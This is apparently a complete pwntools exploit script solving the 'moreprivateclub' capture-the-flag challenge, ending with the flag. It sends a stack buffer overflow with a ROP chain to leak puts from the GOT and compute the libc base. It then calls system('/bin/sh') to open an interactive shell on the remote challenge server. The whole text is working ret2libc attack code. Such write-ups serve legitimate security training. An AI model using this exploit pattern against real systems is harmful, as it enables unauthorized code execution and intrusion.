from pwn import *

elf = ELF("moreprivateclub")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
rop = ROP(elf.path)
offset = 0x37  # 55
r = remote("moreprivateclub.challs.olicyber.it", 10016)

with log.progress("Leaking libc base address") as p:
    r.recvuntil("\n")
    r.sendline("19")
    payload = b'A' * offset
    payload += p64(rop.find_gadget(['pop rdi'])[0])
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.sym['main'])
    r.recvuntil("\n")
    r.sendline(payload)

    r.recvuntil("\n")
    puts = u64(r.recv(6).ljust(8, b'\x00'))
    p.status("puts %s", hex(puts))
    libc_base = puts - libc.sym['puts']
    p.success(hex(libc_base))
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi'])[0])
payload += p64(binsh)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(system)

r.recvuntil("\n")
r.sendline("19")

r.recvuntil("\n")
r.sendline(payload)
r.recvuntil("Non hai il badge, mi dispiace.\n")
r.interactive()

# flag{r3t2wh3r31w4nt}
